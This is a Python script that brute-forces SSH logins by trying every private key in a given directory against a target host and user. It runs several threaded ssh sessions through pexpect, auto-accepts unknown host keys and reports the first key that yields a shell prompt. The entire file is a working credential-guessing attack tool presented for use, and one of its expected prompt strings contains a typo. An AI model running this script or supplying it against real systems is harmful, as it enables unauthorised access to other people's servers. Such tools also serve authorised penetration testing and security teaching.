import pexpect
import argparse
import os
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0

def connect(user, host, keyfile, release):
	global Stop
	global Fails
	try:
		perm_denied = 'Permission denied'
		ssh_newkey  = 'Are you suer you want to continue'
		conn_closed  = 'Connection closed by remote host'
		opt         = ' -o PasswordAuthentication=no'
		connStr     = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt
		
		child = pexpect.spawn(connStr)
		ret   = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#', ])   #waits for the child to return one of the following
		
		if ret == 2:
			print('[-] Adding Host to ~./.ssh/known_hosts')
			child.sendline('yes')																   	#if ssh_newkey is returned by child, make it confirm the connection
			connect(user, host, keyfile, False)
		elif ret == 3:
			print('[-] Connection Closed By Remote Host')
			Fails += 1
		elif ret > 3:
			print('[+] Success ' + str(keyfile))
			Stop = True
	finally:
		if release:
			connection_lock.release()
			
def main():
		parser = argparse.ArgumentParser(description='Brute force ssh private keys')
		parser.add_argument('-H', required=True, help='specify target host')
		parser.add_argument('-d', required=True, help='specify directory with keys')
		parser.add_argument('-u', required=True, help='specify the user')
		args = parser.parse_args()
		
		host    = args.H
		passDir = args.d
		user    = args.u
		
		for filename in os.listdir(passDir):														#returns a list containing the keys
			if Stop:
				print('[*] Exiting: Key Found')
				exit(0)
			if Fails > 5:
				print('[!] Exiting: Too Many Connections Closed By Remote Host')
				print('[!] Adjust number of simultaneous threads')
				exit(0)
			connection_lock.acquire()																#locks the thread from printing anything
			fullpath = os.path.join(passDir, filename)
			print('[-] Testing keyfile ' + str(fullpath))
			t = Thread(target=connect, args=(user, host, fullpath, True))
			child = t.start()
			
if __name__ == '__main__':
	main()		
